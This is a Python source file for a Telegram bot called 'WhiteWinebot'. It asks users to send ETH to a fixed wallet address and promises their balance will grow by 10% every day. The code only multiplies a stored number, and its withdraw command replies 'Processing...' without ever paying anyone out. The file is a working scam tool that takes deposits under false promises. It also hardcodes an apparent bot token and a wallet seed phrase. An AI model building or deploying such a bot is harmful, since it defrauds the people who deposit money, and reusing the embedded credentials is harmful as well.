from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
from web3 import Web3
import sqlite3
import time

# --- CONFIGURATION ---
BOT_TOKEN = '7829388143:AAEnFL-pBXJ65sE4B1QmRvsC6YIw_HUsGUw'
INFURA_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
WALLET_ADDRESS = '0x94B4FE1e94F3D669e930b492ED57a372513B3488'
PRIVATE_KEY = 'during easy cream latin spend wrap income easy advice filter social type'

# --- DATABASE SETUP ---
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                deposit REAL,
                balance REAL,
                last_update INTEGER)''')
conn.commit()

# --- WEB3 SETUP ---
web3 = Web3(Web3.HTTPProvider(INFURA_URL))

# --- FUNCTIONS ---
def add_user(user_id):
    c.execute("INSERT OR IGNORE INTO users (user_id, deposit, balance, last_update) VALUES (?, 0, 0, ?)",
              (user_id, int(time.time())))
    conn.commit()

def update_balance(user_id):
    c.execute("SELECT balance, last_update FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if user:
        balance, last_update = user
        elapsed_days = (int(time.time()) - last_update) // 86400
        if elapsed_days > 0:
            new_balance = balance * (1.1 ** elapsed_days)
            c.execute("UPDATE users SET balance = ?, last_update = ? WHERE user_id = ?",
                      (new_balance, int(time.time()), user_id))
            conn.commit()

def get_balance(user_id):
    update_balance(user_id)
    c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if user:
        return user[0]
    return 0

def set_initial_balance(user_id, deposit):
    c.execute("UPDATE users SET deposit = ?, balance = ?, last_update = ? WHERE user_id = ?",
              (deposit, deposit, int(time.time()), user_id))
    conn.commit()

# --- TELEGRAM COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    user_name = update.message.from_user.first_name
    add_user(user_id)
    bal = get_balance(user_id)
    keyboard = [[InlineKeyboardButton("Copy Wallet Address", callback_data="copy_wallet_address")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        with open("C:\\Users\\ikone\\Desktop\\31231.png", 'rb') as image:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=image)
    except FileNotFoundError:
        await update.message.reply_text("❌ Could not find the welcome image. Please check the file path.")

    await update.message.reply_text(
        f"🎉 Welcome to the WhiteWinebot, *{user_name}*! 🚀\n\n"
        f"💰 Your current balance: {bal:.4f} ETH 💰\n\n"
        "👉 How it works:\n\n"
        "💸 Deposit ETH to your wallet address.\n"
        "📈 Watch your deposit grow by 10% every day! 💰✨\n"
        "🔁 Check your balance anytime using /balance.\n\n"
        f"🔑 Deposit address: {WALLET_ADDRESS} 🏦\n\n"
        "🍇 P.S. Don't forget to buy the wine stored in the basement—it's aged and worth it! 🍷",
        reply_markup=reply_markup
    )

async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    add_user(user_id)
    await update.message.reply_text(f"Send your deposit to this address: {WALLET_ADDRESS} 🏦")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    bal = get_balance(user_id)
    c.execute("SELECT deposit FROM users WHERE user_id = ?", (user_id,))
    user_deposit = c.fetchone()[0]
    remaining_balance = user_deposit - bal
    await update.message.reply_text(
        f"Your balance: {bal:.4f} ETH 🌱 (Growing by 10% daily!)\n"
        f"Remaining balance: {remaining_balance:.4f} ETH 💵"
    )

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    try:
        amount = float(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Please specify the amount you want to withdraw. 💵")
        return

    bal = get_balance(user_id)
    if amount > bal:
        await update.message.reply_text(f"💡 Insufficient funds! You have {bal:.4f} ETH.")
    else:
        await update.message.reply_text("👌 Withdrawal request received. Processing...")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    await update.message.reply_text(
        f"👋 Hello, *{user_name}*! Here's how you can use the bot effectively:\n\n"
        "1⃣ **Deposit**: Use the /deposit command to send ETH to your wallet address.\n"
        f"🔑 Address: {WALLET_ADDRESS} 🏦\n\n"
        "2⃣ **Balance**: Use /balance to check your current balance and growth. 📈\n\n"
        "3⃣ **Withdraw**: Use /withdraw <amount> to withdraw funds. 💵\n\n"
        "4⃣ **Settings**: Use /settings to learn about additional features and options.\n\n"
        "💡 If you need further assistance, just ask!"
    )

async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    await update.message.reply_text(
        f"🌟 *{user_name}*, here are some advanced options and tips:\n\n"
        "1⃣ **Priority Fees** 🚀: Speed up transactions with priority fees.\n\n"
        "2⃣ **Growth** 💡: Watch your balance grow automatically by 10% daily.\n\n"
        "3⃣ **Withdraw Anytime** 💵: Flexible withdrawal options at your fingertips.\n\n"
        "We're here to make your crypto journey seamless!"
    )

# --- BOT INITIALIZATION ---
application = Application.builder().token(BOT_TOKEN).build()

application.add_handler(CommandHandler('start', start))
application.add_handler(CommandHandler('deposit', deposit))
application.add_handler(CommandHandler('balance', balance))
application.add_handler(CommandHandler('withdraw', withdraw))
application.add_handler(CommandHandler('help', help_command))
application.add_handler(CommandHandler('settings', settings))

application.run_polling()
